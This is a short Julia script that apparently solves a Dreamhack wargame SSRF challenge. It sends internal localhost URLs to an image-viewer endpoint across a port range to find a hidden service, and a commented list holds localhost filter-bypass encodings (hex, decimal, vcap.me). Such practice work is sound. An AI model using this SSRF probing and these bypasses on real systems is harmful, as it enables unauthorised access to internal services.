using HTTP

"""
brute force for microservice
# Arguments
minn => int, minimum port
maxn => int, maximum port
url => str, url of target
iml => str, not found image src value
"""
function main(minn::Integer, maxn::Integer, url::String, iml::String)
    #=localpass = [
        "http://vcap.me",
        "http://0x7f.0x00.0x00.0x01",
        "http://0x7f000001",
        "http://2130706433",
        "http://Localhost",
        "http://127.0.0.255"
    ]=#
    localpass = "http://Localhost"
    asyncmap(minn:maxn) do i
        a = true
        res = iml
        try
            res = String(HTTP.post("$url", [], HTTP.Form(["url" => "$localpass:$i"])).body)
        catch
            print("Port $i is not open\n")
            a = false
        end
        if a && !occursin(iml, res)
            print("Brute force is done, port is -> $i\n")
            print(res)
            exit(0)
        end
    end
    print("Brute force failed, max is $maxn\n")
end

main(1500, 1800, "http://host2.dreamhack.games:22912/img_viewer", "iVBORw0KG")
